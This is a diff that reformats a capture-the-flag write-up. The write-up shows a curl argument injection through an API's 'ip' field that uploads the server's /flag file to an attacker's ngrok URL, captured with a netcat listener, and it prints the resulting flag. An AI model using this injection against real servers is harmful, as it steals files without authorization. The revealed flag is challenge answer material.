@@ -195,6 +195,7 @@ After checking the available curl options, I found that `-T` can be used to uplo
 
 So if I can inject additional curl arguments, I can make the server upload `/flag` to a server I control.
 
+---
 ## **Setting Up a Listener**
 
 I used **`ngrok`** to expose my local machine to the internet.
@@ -220,13 +221,18 @@ $ nc -lvnp 8000
 listening on [any] 8000 ...
 ```
 
+---
 ## **Sending the Payload**
+
+***Note:***  The challenge instance was restarted during testing, so the application port changed from `30007` to `36319`.
 
 ```
 $ curl -X POST http://165.22.111.214:36319/api/curl -d "ip=-T /flag https://dandelion-kiln-trillion.ngrok-free.dev"
 ```
 
 Since curl interprets this as an upload option, it reads the local file and sends it to an external HTTP or HTTPS server.
+
+---
 ## **Output**
 
 On the Netcat listener, I received the following request:
@@ -249,6 +255,8 @@ NXS{f1l3_r3tr13v4l_4s_4_s3rv1c3}
 ```
 
 The contents of the `/flag` file were successfully sent to my server.
+
+---
 ## **Flag**
 
 **NXS{f1l3_r3tr13v4l_4s_4_s3rv1c3}**
